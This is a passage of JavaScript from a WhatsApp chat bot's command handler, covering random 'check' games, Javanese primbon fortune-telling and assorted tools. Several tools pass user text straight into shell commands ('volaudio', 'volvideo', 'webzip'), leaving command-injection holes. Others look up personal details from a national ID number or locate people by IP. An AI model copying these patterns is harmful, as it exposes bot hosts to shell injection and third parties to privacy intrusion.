const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
RezzHost.sendMessage(m.chat, { text: xeonkak }, { quoted: kalgans })
break
case 'handsomecheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Kayy`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
RezzHost.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: kalgans })
					break
case 'beautifulcheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
RezzHost.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: kalgans })
					break
					case 'charactercheck':
					if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					RezzHost.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: kalgans })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return reply('kusus group')
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
RezzHost.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: kalgans })
} else if (mentionByTag[0] && isGroup) {
RezzHost.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: kalgans })
} else if (!mentionByReply && !mentionByTag[0]) {
RezzHost.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: kalgans })
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rezz, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'artinama': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerezzw`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'kecocokannama': case 'cocoknama': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerez, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerez|Salwa`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
case 'sifatusaha': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
case 'rejeki': case 'rezeki': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'pekerjaan': case 'kerja': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
case 'potensipenyakit': case 'penyakit': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'artitarot': case 'tarot': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'fengshui': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerez, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
case 'haribaik': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'harisangar': case 'taliwangke': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'harinaas': case 'harisial': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
case 'nagahari': case 'harinaga': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'peruntungan': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerez, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'weton': case 'wetonjawa': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
case 'sifat': case 'karakter': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerez, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
case 'keberuntungan': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} Rerez, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
case 'memancing': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'masasubur': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'zodiak': case 'zodiac': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'shio': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return reply2(anu.message)
 RezzHost.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break

// BATAS FUN MENU



// TOOLS MENU

case  'lacakip': {
if (!text) return reply(`*Example:* ${prefix + command} 165.282.18.191`)
 try {
reply(mess.getdata)
 let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
 await RezzHost.sendMessage(from, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude }},{ ephemeralExpiration: 604800 });
 } catch (e) { 
 return { error: `IP ${text} not found!` };
 }
}
break
case 'tts-tiktok':{
if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
RezzHost.sendMessage(m.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
case 'volaudio': {
if (!text) return reply(`Example: ${prefix + command} 10`)
if (!/audio/.test(mime)) return reply(`${systemN} feature only audio`)
media = await RezzHost.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
RezzHost.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: fcall})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!text) return reply(`Example: ${prefix + command} 10`)
if (!/video/.test(mime)) return reply(`${systemN} feature only video`)
media = await RezzHost.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
RezzHost.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: fcall})
fs.unlinkSync(rname)
})
}
break
case 'getfps': {
if (!quoted) return reply(`reply video`)
if (!/video/.test(mime)) return reply(`send/reply video with the caption .${command}`)
let media = await quoted.download()
let url = await uploadImage(media)
let fps = await chApi.getVideoFPS(url)
reply(`${fps} FPS`)
}
break
case 'cropshape': {
try {
if (!quoted) return reply(`reply Img nya mas`)
if (!/image/.test(mime)) return reply(`reply Image nya mas`)
await loading()
let im = await quoted.download()
let imgs = await uploadImage(im)
let anu = await fetchJson(`https://api.neoxr.my.id/api/cropshape?image=${imgs}&style=circle&apikey=${ApiNx}`)
RezzHost.sendImage(m.chat, anu.data.url, mess.done, kalgans)
} catch (e) {
console.log(e)
return falseR
}
}
break
case 'cekresi': {
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} JX1710180625 jnt`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/checker/cekresi?apikey=${xfarApi}&resi=${args[0]}&kurir=${args[1]}`)
let teks = `乂 *R E S I - C H E C K*\n\n`
teks += `Code : ${anu.result.code}\n`
teks += `Status : ${anu.result.status}\n`
teks += `Shipment : ${anu.result.date_shipment}\n`
teks += `Received : ${anu.result.date_received}\n`
teks += `Receiver : ${anu.result.receiver}\n`
teks += `Position : ${anu.result.current_position}\n\n`
teks += `*HISTORY* :\n\n`
anu.result.history.map((v, i) => {
teks += `${i+1}.\n`
teks += `*Time* : ${v.time}\n`
teks += `*Position* : ${v.position}\n`
teks += `*Desc* : ${v.desc}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'ceknik': {
if (!text) return reply(`mana NIK nya bang`)
reply(mess.getdata)
let nk = await fetchJson(`https://api.xfarr.com/api/checker/ceknik?apikey=${xfarApi}&nik=${text}`)
let nki = nk.result
let caption = `N I K - C H E C K

     ⦿ NIK : ${nki.nik}
     ⦿ Kelamin : ${nki.kelamin}
     ⦿ Lahir : ${nki.lahir}
     ⦿ Provinsi : ${nki.provinsi}
     ⦿ Kabupaten : ${nki.kotakab}
     ⦿ Kecamatan : ${nki.kecamatan}
     ⦿ Uniqcode : ${nki.uniqcode}
     ⦿ KodePos : ${nki.tambahan.kodepos}
     ⦿ Pasaran : ${nki.tambahan.pasaran}
     ⦿ Usia : ${nki.tambahan.usia}
     ⦿ UlangTahun : ${nki.tambahan.ultah}
     ⦿ Zodiak : ${nki.tambahan.zodiak}

${footer}`
let cap = Styles(caption)
RezzHost.sendMessage(m.chat, {
text: cap,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `N I K`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'brightness': {
if (!quoted) return reply(`reply image nya bang`)
if (!text) return reply(`Example:\n( reply Image ). ${prefix + command} 3`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.search)
let media = await quoted.download()
let urlny = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://api.xfarr.com/api/canvas/brightness?apikey=${xfarApi}&img=${urlny}&number=${text}`, mess.success, kalgans)
}
break
case 'cekusia': {
if (!quoted) return reply(`[ ! ] send/reply media with caption *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`[ ! ] send/reply media with caption *${prefix + command}*`)
let img = await quoted.download()
let out = await uploadImage(img)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/agedetect?apikey=${apikey}&img=${out}`)
let txt = `乂 C H E C K - U S I A\n\n*Usia :* ${anu.result} Tahun.\n\n\n${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `A G E - D E T E C T`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'detectface': {
if (!quoted) return reply(`[ ! ] send/reply media with caption *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`[ ! ] send/reply media with caption *${prefix + command}*`)
reply(mess.getdata)
let img = await quoted.download()
let out = await uploadImage(img)
RezzHost.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/facedetect?apikey=${apikey}&img=${out}` }, caption: mess.done }, { quoted: kalgans })
}
break
case 'webanalyzer': {
if (!text) return reply(`Example: ${prefix+command} https://github.com`)
reply(mess.getdata)
let sult = await fetchJson(`https://api.caliph.biz.id/api/wappalyzer?url=${text}&apikey=${caliph}`)
let rsult = sult.result.technologies
let cap = `乂 W E B - A N A L Y Z E R\n\n`
sult.result.technologies.map((v, i) => {
cap += `${i+1}. 
    ◦‎  Slug : ${v.slug}
    ◦‎  Name : ${v.name}
    ◦‎  Description : ${v.description}
    ◦‎  Confidence : ${v.confidence}
    ◦‎  Version : ${v.version}
    ◦‎  Icon : ${v.icon}
    ◦‎  Website : ${v.website}
    ◦‎  Cpe : ${v.cpe}
    ◦‎  RootPath : ${v.rootPath}\n\n`
}).join('\n\n')
cap += `${footer}`
RezzHost.sendMessage(m.chat, {
text: cap,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `W E B - A N A L Y Z`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'webzip': {
if (!isCreator) throw mess.owner;
if (!q) return m.reply('Link web yang mau di ambil mana')
const myURL = new URL(q)
const lok = './src/'+myURL.hostname
const wget = await exec(`cd src && rm -rf ${myURL.hostname}* && wget -mkEpnp --no-if-modified-since ${q}`)
let log = ''
wget.stderr.on("data", async(response)=>{
log += response+''
})
const ngelog = setInterval(async() => {
await RezzHost.sendMessage(from, {text: log}, {quoted:m})
log = ''
}, 10000)
wget.stderr.on('close', async(response)=>{
clearInterval(ngelog)
await RezzHost.sendMessage(from, {text: "Zipping..."}, {quoted:m})
await exec(`cd src && zip -9 -r ${myURL.hostname}.zip ${myURL.hostname} && rm -rf ${myURL.hostname}`)
.stderr.on('close', async() => {
await RezzHost.sendMessage(from, {document: {url: lok+'.zip'}, mimetype:'application/zip', fileName: myURL.hostname+'.zip'}, {quoted:m})
})
})
}
break
case 'bukavn': {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply(`Reply Vn`)
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
var media = await downloadContentFromMessage(quotedType, type == "audioMessage" ? "audio" : "image")
let buffer = Buffer.from([])
for await (let chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/audio/.test(type)) {
await RezzHost.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mp4', ptt: true}, {quoted: m})}
}
break
case 'readbarcode': {
if (!quoted) return reply(`Reply Image Barcode`)
if (!/image/.test(mime)) return reply(`Reply Image Barcode`)
reply(mess.getdata)
let img = await quoted.download()
let out = await uploadImage(img)
let json = await fetchJson(`https://docs-jojo.herokuapp.com/api/barcode_read?image_url=${out}`)
let txt = `*TEXT :*\n${json.result.raw_text}\n\n`
txt += `*raw bytes :*\n${json.result.raw_bytes}\n\n\n`
txt += global.footer
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `R E A D - B A R C O D E`,
body: '',
thumbnailUrl: out,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'createbarcode': {
if (!text) throw `[ ! ] *example:* ${usedPrefix + command} text`
reply(mess.wait)
try {
RezzHost.sendImage(m.chat, `https://barcodeapi.org/api/128/${text}`, mess.success, kalgans)
} catch (e) {
console.log(e)
reply(`Terjadi kesalahan, coba lagi nanti.`)
}
}
break
case 'createmail': {
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/tools/randommail2?apikey=${xfarApi}`)
reply(`${anu.result}`)
}
break
case 'dns': case 'lookup': {
if (!text) throw `Masukkan Domain/Sub Domain!\n\n*Contoh:* botcahx.live`
	let anu = await lookup(text.replace(/^https?:\/\//, ''))
